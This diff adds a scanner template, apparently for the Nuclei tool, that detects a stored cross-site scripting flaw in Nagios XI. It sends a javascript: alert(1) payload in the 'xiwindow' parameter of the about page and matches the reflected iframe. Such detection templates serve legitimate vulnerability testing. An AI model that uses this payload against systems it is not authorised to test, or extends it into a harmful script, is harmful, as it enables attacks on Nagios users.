@@ -1,0 +1,20 @@
+id: poc-nagiosxi-xss
+info:
+  name: Nagios XI Stored Cross-Site Scripting (XSS) Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xss
+  description: |
+    This template detects a stored XSS vulnerability in Nagios XI via the `xiwindow` parameter.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nagiosxi/about/index.php?xiwindow=a:javascript:(alert(1))//"
+      - "{{BaseURL}}/about/index.php?xiwindow=a:javascript:(alert(1))//"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<iframe src=\"javascript:(alert(1))//"
+          - "Nagios"
